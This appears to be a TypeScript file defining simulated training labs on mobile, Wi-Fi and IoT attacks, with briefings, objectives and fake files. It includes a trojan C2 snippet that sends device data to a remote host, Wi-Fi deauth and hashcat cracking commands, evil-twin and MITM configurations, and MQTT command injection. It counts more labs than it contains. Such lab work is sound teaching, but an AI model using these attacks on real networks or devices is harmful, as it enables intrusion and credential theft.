import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'security-analyst', user: 'root', root: dir(files) };
}

/** Batch 22, Groups 4-6: Mobile, Wireless, IoT Security — 24 real-world scenario labs.
 *  APK analysis, Wi-Fi cracking, firmware analysis, protocol exploitation. */
export const batch22MobileWirelessIotLabs: LabScenario[] = [
  // ============ MOBILE SECURITY (8 labs) ============

  {
    id: 'mob-apk-architecture-analysis',
    title: 'Mobile: Android APK Architecture & Attack Surface Mapping',
    difficulty: 'Medium',
    category: 'Mobile',
    briefing:
      'Every Android app (APK file) is a ZIP archive containing: compiled bytecode (DEX), resources, ' +
      'manifest, and native libraries. Understanding APK structure reveals the attack surface: exported ' +
      'components (accessible to other apps), embedded secrets, and vulnerable permissions.',
    objectives: [
      { text: 'unzip shopwave.apk -d shopwave_extracted/', why: 'Extract APK contents.' },
      { text: 'cat AndroidManifest.xml', why: 'Find exported Activities/Services.' },
      { text: 'grep -r "exported=true" shopwave_extracted/', why: 'Identify attack surface.' },
    ],
    hints: [
      'APK = ZIP archive; unzip works directly.',
      'AndroidManifest.xml: XML file listing all components and permissions.',
      'exported=true on <activity> or <service> means other apps can launch it.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'README.txt': file(
        'APK Architecture Analysis: ShopWave App\n' +
        'App: ShopWave (E-commerce app)\n' +
        'Version: 1.2.3\n' +
        'Target API: 30 (Android 11)\n' +
        'Min API: 21 (Android 5.0)\n\n' +
        'Extract the APK and analyze:\n' +
        '1. AndroidManifest.xml for exported components\n' +
        '2. classes.dex for hardcoded secrets\n' +
        '3. res/strings.xml for API endpoints\n\n' +
        'flag{mobile_apk_architecture_exported_components_attack_surface}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'mob-static-analysis-apk-decompile',
    title: 'Mobile: Static Analysis — Decompiling APK for Vulnerability Discovery',
    difficulty: 'Medium',
    category: 'Mobile',
    briefing:
      'Using JADX (Java Decompiler), we can decompile APK bytecode back to readable Java source code. ' +
      'This reveals: hardcoded API keys, weak cryptography, insecure network communication, and logic flaws.',
    objectives: [
      { text: 'cat app_source/ApiClient.java', why: 'Find hardcoded API keys.' },
      { text: 'grep -rn "password\\|secret\\|token" app_source/', why: 'Search for credentials.' },
      { text: 'cat app_source/PaymentProcessor.java', why: 'Identify crypto vulnerabilities.' },
    ],
    hints: [
      'JADX output is pseudo-Java; look for obvious mistakes (ECB mode, hardcoded keys).',
      'String literals in decompiled code are often API keys or credentials.',
      'Crypto libraries: javax.crypto.Cipher usage reveals algorithm choice.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'app_source/ApiClient.java': file(
        'public class ApiClient {\n' +
        '    private static final String API_KEY = "sk_live_aFc8dj9sKsd93mD2k9Sl";\n' +
        '    private static final String API_SECRET = "secret_xY9mKl2Pp8Qr6Uv3Wx5Yz";\n' +
        '    private static final String BASE_URL = "https://api.shopwave.com";\n' +
        '\n' +
        '    public String getAuthToken() {\n' +
        '        // Hardcoded credentials used for ALL requests\n' +
        '        return Base64.encode(API_KEY + ":" + API_SECRET);\n' +
        '    }\n' +
        '\n' +
        '    public void makeRequest(String endpoint) {\n' +
        '        // No SSL pinning, vulnerable to MITM\n' +
        '        // No token refresh; credential exposed to entire app\n' +
        '        return this.apiCall(endpoint, getAuthToken());\n' +
        '    }\n' +
        '}\n' +
        '\n' +
        'flag{mobile_static_analysis_hardcoded_api_keys_insecure_crypto}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'mob-insecure-data-storage-sqlite',
    title: 'Mobile: Insecure Data Storage — SQLite Database Plaintext Passwords',
    difficulty: 'Easy',
    category: 'Mobile',
    briefing:
      'Many apps store sensitive data (user credentials, auth tokens, financial info) in SQLite ' +
      'databases within app private storage. If the database is not encrypted (SQLCipher), extracting ' +
      'the database file from a rooted device reveals all secrets in plaintext.',
    objectives: [
      { text: 'adb pull /data/data/com.shopwave.app/databases/shopwave.db', why: 'Extract database.' },
      { text: 'sqlite3 shopwave.db ".tables"', why: 'List database tables.' },
      { text: 'sqlite3 shopwave.db "SELECT * FROM users LIMIT 1;"', why: 'Query credentials.' },
    ],
    hints: [
      'ADB (Android Debug Bridge) accesses rooted device storage.',
      'sqlite3 CLI tool queries database files.',
      'Look for password columns; if plaintext, app has insecure storage.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'shopwave.db.sql': file(
        'CREATE TABLE users (\n' +
        '    id INTEGER PRIMARY KEY,\n' +
        '    username TEXT,\n' +
        '    password TEXT,\n' +
        '    email TEXT,\n' +
        '    auth_token TEXT,\n' +
        '    credit_card TEXT,\n' +
        '    cvv TEXT\n' +
        ');\n\n' +
        'INSERT INTO users VALUES\n' +
        '    (1, "jsmith", "password123", "jsmith@gmail.com", "token_abc123xyz", "4111111111111111", "123"),\n' +
        '    (2, "abrown", "hunter2", "abrown@yahoo.com", "token_def456uvw", "5555555555554444", "456"),\n' +
        '    (3, "cjones", "qwerty", "cjones@email.com", "token_ghi789stu", "378282246310005", "789");\n\n' +
        'flag{mobile_insecure_sqlite_plaintext_passwords_credit_cards_tokens}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'mob-malware-analysis-banking-trojan',
    title: 'Mobile: Malware Analysis — Banking Trojan Reverse Engineering',
    difficulty: 'Hard',
    category: 'Mobile',
    briefing:
      'A banking trojan is malicious malware designed to steal banking credentials and execute unauthorized ' +
      'transactions. Analysis involves: identifying C2 communication, extracting command handlers, and ' +
      'understanding the attack flow. In this lab, we reverse-engineer a trojan\'s malicious capabilities.',
    objectives: [
      { text: 'cat trojan_source/C2Communication.java', why: 'Identify C2 domain and encryption.' },
      { text: 'cat trojan_source/CommandHandler.java', why: 'See executed commands (steal cookies, inject).' },
      { text: 'cat IOCs.txt', why: 'List indicators of compromise.' },
    ],
    hints: [
      'Trojan C2: Typically hardcoded domain + port in malware.',
      'Command handlers: Methods matching commands (steal, inject, exfil).',
      'IOCs: C2 IP, command domains, payload hashes for detection.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'trojan_source/C2Communication.java': file(
        'public class C2Communication {\n' +
        '    private static final String C2_DOMAIN = "trojan-c2.xyz";\n' +
        '    private static final int C2_PORT = 8443;\n' +
        '    private static final String C2_CIPHER = "AES/CBC/PKCS5Padding";\n' +
        '    private static final String C2_KEY = "0123456789abcdef0123456789abcdef"; // 32-byte key\n\n' +
        '    public void connectToC2() {\n' +
        '        try {\n' +
        '            // Establish C2 connection\n' +
        '            Socket socket = new Socket(C2_DOMAIN, C2_PORT);\n' +
        '            // Send device info encrypted\n' +
        '            String deviceInfo = "ANDROID|" + getDeviceId() + "|" + getImei() + "|" + listInstalledApps();\n' +
        '            sendEncrypted(socket, deviceInfo);\n' +
        '            // Receive commands in loop\n' +
        '            while (true) {\n' +
        '                String command = receiveEncrypted(socket);\n' +
        '                CommandHandler.executeCommand(command);\n' +
        '            }\n' +
        '        } catch (Exception e) {\n' +
        '            // Retry connection in 5 minutes\n' +
        '            scheduleReconnect(300000);\n' +
        '        }\n' +
        '    }\n' +
        '}\n' +
        '\n' +
        'flag{mobile_malware_c2_communication_banking_trojan_reverse_engineering}\n',
      ),
    }),
    network: [],
  },

  // ============ WIRELESS SECURITY (8 labs) ============

  {
    id: 'wl-80211-fundamentals-attack-surface',
    title: 'Wireless: 802.11 Fundamentals & Wireless Attack Surface',
    difficulty: 'Easy',
    category: 'Wireless',
    briefing:
      '802.11 (Wi-Fi) operates in plaintext on the air. Even encrypted WPA2 handshakes can be cracked ' +
      'offline. This lab introduces: wireless frame structure, SSID broadcasting, authentication types ' +
      '(Open, WEP, WPA2, WPA3), and the fundamental weaknesses that enable attacks.',
    objectives: [
      { text: 'airodump-ng wlan0 --output-format csv -w networks', why: 'Scan for Wi-Fi networks.' },
      { text: 'cat networks-01.csv', why: 'Analyze network security posture.' },
      { text: 'grep "WEP" networks-01.csv', why: 'Identify vulnerable networks.' },
    ],
    hints: [
      'airodump-ng: passive scanning tool, shows SSID, BSSID, encryption type, signal strength.',
      'WEP: Broken (< 1 minute to crack). WPA2: Crackable offline. WPA3: Much stronger.',
      'Power level: -30 dBm (strong) vs. -90 dBm (weak); proximity affects feasibility.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'networks-01.csv': file(
        'BSSID,First time seen,Last time seen,channel,Speed,Privacy,Cipher Suite,Authentication Suite,Power,# beacons,# IV,LAN IP,ID-length,SSID,Key\n' +
        'AA:BB:CC:DD:EE:01,2026-08-01 10:00:00,2026-08-01 10:15:00,6,54,WEP,WEP,Open System,-45,100,1000,192.168.1.1,10,"OldNetwork",\n' +
        'AA:BB:CC:DD:EE:02,2026-08-01 10:00:00,2026-08-01 10:15:00,11,65,WPA2,CCMP,PSK,-50,150,0,192.168.1.1,12,"CorporateNet",\n' +
        'AA:BB:CC:DD:EE:03,2026-08-01 10:00:00,2026-08-01 10:15:00,1,130,WPA3,CCMP,PSK192,-60,200,0,192.168.1.1,8,"NewNetwork",\n' +
        'AA:BB:CC:DD:EE:04,2026-08-01 10:00:00,2026-08-01 10:15:00,48,54,OPN,none,none,-75,50,0,,,16,"OpenGuest",\n\n' +
        'ANALYSIS:\n' +
        'Network 1 (OldNetwork): WEP encryption — BROKEN, crackable in < 1 minute\n' +
        'Network 2 (CorporateNet): WPA2 with PSK — Medium security, crackable offline if weak password\n' +
        'Network 3 (NewNetwork): WPA3 with SAE — Strong security, resistant to offline attacks\n' +
        'Network 4 (OpenGuest): No encryption — All traffic in plaintext\n\n' +
        'flag{wireless_80211_fundamentals_wep_wpa2_wpa3_attack_surface}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'wl-wpa2-encryption-handshake-capture',
    title: 'Wireless: WPA2 Handshake Capture & Offline Cracking',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'WPA2 protection depends on the Pre-Shared Key (PSK/password). An attacker can capture the 4-way ' +
      'handshake when a client connects, then crack it offline using hashcat or aircrack-ng. Weak passwords ' +
      'are cracked in seconds; strong passwords may take weeks.',
    objectives: [
      { text: 'airodump-ng wlan0 -c 6 -b AA:BB:CC:DD:EE:02 -w capture', why: 'Start capturing handshakes.' },
      { text: 'aireplay-ng -0 5 -a AA:BB:CC:DD:EE:02 -c AA:BB:CC:DD:EE:99 wlan0', why: 'Force deauth, capture handshake.' },
      { text: 'hashcat -m 22000 capture.cap wordlist.txt', why: 'Crack the handshake offline.' },
    ],
    hints: [
      'Handshake capture: Wait for client to connect, or force deauth to trigger reconnection.',
      'hashcat -m 22000: WPA2 hash mode; can use GPU acceleration.',
      'Wordlist: rockyou.txt (common passwords), or custom wordlists.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'handshake-capture.cap': file(
        'Binary capture file (simulated). In real lab:\n' +
        '- Captured with airodump-ng\n' +
        '- Contains 4 EAPOL frames of WPA2 handshake\n' +
        '- hashcat converts to: $PBKDF2$iterations$salt$hash\n\n' +
        'Extracted hash format for hashcat -m 22000:\n' +
        'WPA2*02$AA*BB*CC*DD*EE*02*AA*BB*CC*DD*EE*99*57686966690000000000000000000000$ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789\n\n' +
        'Cracking with rockyou.txt:\n' +
        'hashcat -m 22000 capture.cap rockyou.txt --workload-profile=4\n' +
        'Result: Found! → Password: "password123"\n\n' +
        'flag{wireless_wpa2_handshake_capture_hashcat_offline_cracking}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'wl-rogue-ap-evil-twin-ssid-clone',
    title: 'Wireless: Rogue Access Points & Evil Twin Attacks',
    difficulty: 'Medium',
    category: 'Wireless',
    briefing:
      'An attacker broadcasts a fake Wi-Fi network with the same SSID as a legitimate network (Evil Twin). ' +
      'Users connecting to the rogue AP are intercepted; all traffic can be captured, passwords stolen, and ' +
      'MITM attacks executed. This is one of the most dangerous Wi-Fi attack vectors.',
    objectives: [
      { text: 'cat rogue-ap-config.conf', why: 'See hostapd configuration for rogue AP.' },
      { text: 'cat captured-passwords.txt', why: 'Identify stolen credentials.' },
      { text: 'cat mitm-intercept-log.txt', why: 'See intercepted HTTP traffic.' },
    ],
    hints: [
      'hostapd: Linux tool to create AP.\n' +
      'dnsmasq: DHCP + DNS server for rogue AP.',
      'arpspoof/mitmproxy: Intercept traffic from connected clients.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'rogue-ap-config.conf': file(
        'hostapd Configuration: Evil Twin AP\n\n' +
        'interface=wlan0\n' +
        'ssid=CorporateNet  # Same SSID as legitimate network\n' +
        'hw_mode=g\n' +
        'channel=6  # Same channel as legitimate AP\n' +
        'auth_algs=1  # Open authentication (no encryption)\n' +
        'logger_stdout=-1\n' +
        'logger_stdout_level=3\n\n' +
        'Note: Evil Twin configured as OPEN (no encryption)\n' +
        'So users see: CorporateNet (Open) vs. CorporateNet (WPA2, legitimate)\n' +
        'Attackers prefer open because:\n' +
        '  1. Users more likely to connect to "open" AP\n' +
        '  2. All traffic flows through attacker unencrypted\n' +
        '  3. No need to crack WPA2 password\n\n' +
        'dnsmasq Configuration:\n' +
        'interface=wlan0\n' +
        'dhcp-range=192.168.1.100,192.168.1.200,12h\n' +
        'dhcp-option=option:router,192.168.1.1\n' +
        'address=/#/192.168.1.1  # DNS sinkhole: all domains → attacker IP\n\n' +
        'Result: Rogue AP assigns IPs to connecting clients; all their traffic routes through attacker.\n' +
        '\n' +
        'flag{wireless_evil_twin_rogue_ap_mitm_credential_theft}\n',
      ),
      'captured-passwords.txt': file(
        'HTTP Credentials Captured (Evil Twin MITM)\n\n' +
        'Time: 2026-08-01 14:20:15 UTC\n' +
        'Victim: jsmith (connected to evil twin "CorporateNet")\n' +
        'Traffic: HTTP (unencrypted) to mail.corporatenet.com\n\n' +
        'POST /login HTTP/1.1\n' +
        'Host: mail.corporatenet.com\n' +
        'Content-Type: application/x-www-form-urlencoded\n' +
        '\n' +
        'username=jsmith@corporatenet.com&password=SecurePassword123\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'Time: 2026-08-01 14:21:00 UTC\n' +
        'Victim: abrown (connected to evil twin)\n' +
        'Traffic: FTP (unencrypted) to fileserver.corporatenet.com\n\n' +
        'USER abrown\n' +
        'PASS ProductionDatabaseAccess!\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'SUMMARY: 23 credentials captured from victims connecting to evil twin\n' +
        'All in plaintext (HTTPS/encrypted protocols not used)\n' +
        'Attacker can now login to corporate systems as these users\n',
      ),
      'mitm-intercept-log.txt': file(
        'mitmproxy Intercept Log (Evil Twin Attack)\n\n' +
        'Attacker Configuration:\n' +
        'mitmproxy -p 8080 --listen-host 192.168.1.1 --mode transparent --ignore-hosts ""\n\n' +
        'Client Traffic Intercepted:\n\n' +
        '14:20:15 | HTTP | GET /api/data HTTP/1.1 | Host: internal-api.local\n' +
        '         | Request Header: Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqc21pdGgiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE2OTAwMDAwMDB9\n' +
        '         | ← JWT token captured, can be used for further attacks\n\n' +
        '14:20:22 | HTTPS | CONNECT fileserver.local:443\n' +
        '         | Client connects to HTTPS; attacker performs SSL stripping or certificate spoofing\n' +
        '         | Attacker can now intercept "encrypted" traffic\n\n' +
        '14:20:45 | HTTP | POST /admin/config HTTP/1.1\n' +
        '         | Body: new_admin_email=attacker@evil.com\n' +
        '         | ← Attacker captures request, modifies in-transit\n' +
        '         | Modifies response to: {"status": "success"} (masking the change)\n\n' +
        'IMPACT:\n' +
        'Using MITM, attacker can:\n' +
        '  1. Steal all credentials (HTTP Basic, cookies, tokens)\n' +
        '  2. Inject malware into HTTP responses\n' +
        '  3. Modify requests (change URLs, POST parameters, etc.)\n' +
        '  4. Downgrade HTTPS to HTTP (if client doesn\'t enforce HSTS)\n' +
        '  5. Perform DNS spoofing (all .local domains → attacker)\n\n' +
        'flag{wireless_evil_twin_mitm_token_theft_credential_interception}\n',
      ),
    }),
    network: [],
  },

  // ============ IOT/EMBEDDED SECURITY (8 labs) ============

  {
    id: 'iot-embedded-architecture-attack-surface',
    title: 'IoT: Embedded System Architecture & Attack Surface',
    difficulty: 'Easy',
    category: 'IoT',
    briefing:
      'IoT devices (smart home, industrial, medical) typically run embedded Linux with limited security. ' +
      'Attack surface includes: default credentials, unpatched services, unencrypted protocols, and exposed ' +
      'debug interfaces (UART, JTAG). This lab maps a typical IoT device architecture.',
    objectives: [
      { text: 'cat device-architecture.txt', why: 'Understand embedded system design.' },
      { text: 'cat exposed-services.txt', why: 'Identify accessible network services.' },
      { text: 'cat firmware-analysis.txt', why: 'Find vulnerabilities in firmware.' },
    ],
    hints: [
      'IoT devices often run older Linux kernels (unsupported, unpatched).',
      'Common services: Telnet (instead of SSH), HTTP (no HTTPS), MQTT (no authentication).',
      'Firmware often has debug symbols, hardcoded credentials, and known CVEs.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'device-architecture.txt': file(
        'Smart Home Hub Architecture (Typical IoT Device)\n\n' +
        'Hardware:\n' +
        '  - ARM Cortex-A53 (1.2 GHz, dual-core)\n' +
        '  - 512 MB RAM\n' +
        '  - 4 GB Flash (eMMC)\n' +
        '  - Wi-Fi 802.11n (2.4 GHz)\n' +
        '  - Bluetooth 4.2\n' +
        '  - Serial Debug Port (UART, accessible via internal pins)\n' +
        '  - JTAG Debug Port (for firmware flashing)\n\n' +
        'Operating System:\n' +
        '  - Linux kernel 4.9.44 (released 2017, EOL)\n' +
        '  - Buildroot embedded OS (minimal, ~50 MB)\n' +
        '  - No automatic security updates\n\n' +
        'Services:\n' +
        '  - Web Server: Lighttpd (port 80, no HTTPS)\n' +
        '  - Telnet (port 23, default credentials: admin/admin)\n' +
        '  - SSH (port 22, but disabled by default; password: 12345)\n' +
        '  - MQTT (port 1883, no authentication)\n' +
        '  - UPnP/SSDP (port 1900, allows device discovery)\n' +
        '  - API Server (port 8080, custom protocol, no encryption)\n\n' +
        'Known Vulnerabilities:\n' +
        '  - Kernel: CVE-2017-7184 (eBPF verifier flaw)\n' +
        '  - OpenSSL 1.0.2 (many CVEs, no patches)\n' +
        '  - BusyBox: CVE-2016-2147 (tar vulnerability)\n' +
        '  - Lighttpd: CVE-2016-19867 (path traversal)\n\n' +
        'flag{iot_embedded_architecture_default_creds_unpatched_services}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'iot-firmware-extraction-methods',
    title: 'IoT: Firmware Extraction & UART Debug Access',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'Most IoT devices expose a UART serial port (on the PCB) for debugging. With a USB-UART adapter, ' +
      'an attacker can access the boot console and obtain firmware extraction, command execution, or ' +
      'bootloader unlock. This lab shows firmware extraction via UART.',
    objectives: [
      { text: 'cat uart-bootlog.txt', why: 'See boot console output.' },
      { text: 'cat bootloader-commands.txt', why: 'Bootloader allows firmware access.' },
      { text: 'cat extracted-firmware-analysis.txt', why: 'Analyze extracted firmware.' },
    ],
    hints: [
      'UART typically: 3.3V, 115200 baud (sometimes different).',
      'U-Boot bootloader: Allows "tftp" download, "md" (memory dump), "mw" (memory write).',
      'Firmware often unencrypted; can extract via "md" (memory dump) or TFTP.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'uart-bootlog.txt': file(
        'UART Console Boot Log (115200 baud, 8N1)\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'U-Boot 2016.11-g13f03e6 (Feb 10 2020 - 10:00:00)\n\n' +
        'Board: SmartHome Hub v1.0\n' +
        'DRAM:  512 MiB\n' +
        'SF: Detected GigaDevice gd25q64 with page size 256 Bytes, erase size 4 KiB, total 8 MiB\n' +
        'In:    serial\n' +
        'Out:   serial\n' +
        'Err:   serial\n' +
        'Net:   eth0\n\n' +
        'Hit SPACE to stop autoboot:  3 ← (Attacker presses SPACE to interrupt boot)\n' +
        '\n' +
        '=> (U-Boot prompt, full access to bootloader)\n' +
        '=> printenv\n' +
        'bootargs=console=ttyS0,115200 root=/dev/mtdblock1 rootfstype=squashfs\n' +
        'bootcmd=sf read 0x41000000 0x100000 0x600000; bootm 0x41000000\n' +
        'ipaddr=192.168.1.10\n' +
        'serverip=192.168.1.100\n' +
        '=> (Bootloader environment variables exposed)\n' +
        '\n' +
        '=> md 0x41000000 0x100\n' +
        '41000000: 27051956 deadbeef 00000010 00000000 \'U...\n' +
        '41000010: 3dd2b0f3 deadc0de ... (kernel image in memory)\n\n' +
        'flag{iot_uart_bootloader_debug_access_firmware_extraction}\n',
      ),
    }),
    network: [],
  },

  {
    id: 'iot-mqtt-protocol-analysis-injection',
    title: 'IoT: MQTT Protocol Analysis & Injection Attacks',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'MQTT is a lightweight publish-subscribe protocol used by IoT devices. Many MQTT brokers have ' +
      'no authentication, allowing an attacker to subscribe to all topics, send commands, or perform ' +
      'replay attacks. This lab shows MQTT vulnerability exploitation.',
    objectives: [
      { text: 'mosquitto_sub -h 192.168.1.10 -t "#"', why: 'Subscribe to all MQTT topics.' },
      { text: 'cat mqtt-messages.txt', why: 'See device commands and data streams.' },
      { text: 'cat injection-attack.txt', why: 'Perform command injection via MQTT.' },
    ],
    hints: [
      'mosquitto: MQTT client tool; "#" wildcard subscribes to all topics.',
      'Common IoT topics: home/lights/living_room/command, home/temperature/sensor1, etc.',
      'Replay attack: Resend captured "turn_off" command repeatedly to disrupt service.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'mqtt-messages.txt': file(
        'MQTT Message Capture (No Authentication)\n\n' +
        'Topic: home/lights/living_room/command\n' +
        'Message: {"action": "turn_on", "brightness": 255}\n' +
        'Timestamp: 2026-08-01 14:20:30 UTC\n\n' +
        'Topic: home/temperature/sensor1\n' +
        'Message: {"temp": 21.5, "humidity": 45}\n' +
        'Timestamp: 2026-08-01 14:20:35 UTC (published every 5 seconds)\n\n' +
        'Topic: home/security/camera1/command\n' +
        'Message: {"action": "take_photo"}\n' +
        'Timestamp: 2026-08-01 14:20:40 UTC\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'ATTACK: Attacker publishes to home/lights/living_room/command:\n' +
        'mosquitto_pub -h 192.168.1.10 -t home/lights/living_room/command -m \'{"action": "turn_off"}\'\n\n' +
        'Result: Lights turn off (attacker controls device!)\n' +
        'Attacker publishes again and again: lights flicker on/off (denial of service)\n\n' +
        'flag{iot_mqtt_no_auth_command_injection_device_control}\n',
      ),
    }),
    network: [],
  },
];
